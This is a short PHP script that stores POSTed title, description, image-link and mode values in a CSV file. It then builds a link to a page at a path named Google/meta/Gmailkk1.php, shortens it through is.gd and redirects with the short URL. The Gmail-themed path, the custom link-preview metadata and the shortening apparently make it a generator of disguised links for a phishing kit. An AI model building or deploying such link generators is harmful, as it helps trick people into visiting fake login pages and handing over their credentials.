<?php
$title = $_POST['title'];
$description = $_POST['description'];
$imagelink = $_POST['imagelink'];
$mod = $_POST['mod'];

$data = array($title, $description, $imagelink, $mod);
$file = fopen('/data.csv', 'a');
fputcsv($file, $data);
fclose($file);

$url = 'https://is.gd/create.php?format=simple&url=' . urlencode('http://' . $_SERVER['HTTP_HOST'] . '/public/Google/meta/Gmailkk1.php?' . http_build_query($_POST));
$short_url = file_get_contents($url);

header('Location: example3.php?url=' . $short_url);
?>
